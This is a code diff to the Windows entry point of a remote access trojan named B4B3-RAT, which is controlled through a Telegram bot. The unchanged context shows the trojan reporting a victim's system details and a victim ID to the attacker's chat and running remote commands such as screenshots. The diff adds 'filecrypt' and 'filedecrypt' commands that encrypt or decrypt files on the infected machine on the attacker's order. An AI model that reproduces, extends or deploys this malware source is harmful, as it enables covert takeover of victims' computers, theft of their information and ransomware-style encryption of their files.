@@ -34,6 +34,7 @@ SOFTWARE.
 #include "Information.h"
 #include "BotNet.h"
 #include "Protector.h"
+#include "FileCryptor.h"
 
 int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, INT) {
 	srand((unsigned int)time(NULL));
@@ -123,7 +124,7 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, INT) {
 			"%0APage size: " + std::to_string(SysInfo.dwProcessorType) +
 			"%0AProcessor: " + GetProcessorBrand() +
 			"%0A%0AFor send command to this user, type: /user" + std::to_string(ID) + " [command]"
-			"%0AP.S: To show commands: click on \"Test BOT API\" in B4B3-RAT Builder.";
+			"%0A%0AP.S: To show commands: click on \"Test BOT API\" in B4B3-RAT Builder.";
 		api.SendTextMessage(s.chatid, information.c_str());
 
 		std::string last;
@@ -346,6 +347,25 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, INT) {
 					}
 					else {
 						api.SendTextMessage(s.chatid, "Error! Screenshot was not created");
+					}
+				}
+
+				// FILE CRYPTOR
+				else if (params[0] == "filecrypt") {
+					if (FileCrypt(params[1], params[2])) {
+						api.SendTextMessage(s.chatid, "Success! File crypted");
+					}
+					else {
+						api.SendTextMessage(s.chatid, "Error! File not crypted. Maybe, file not found?");
+					}
+				}
+
+				else if (params[0] == "filedecrypt") {
+					if (FileDecrypt(params[1], params[2])) {
+						api.SendTextMessage(s.chatid, "Success! File decrypted");
+					}
+					else {
+						api.SendTextMessage(s.chatid, "Error! File not decrypted");
 					}
 				}
 			}
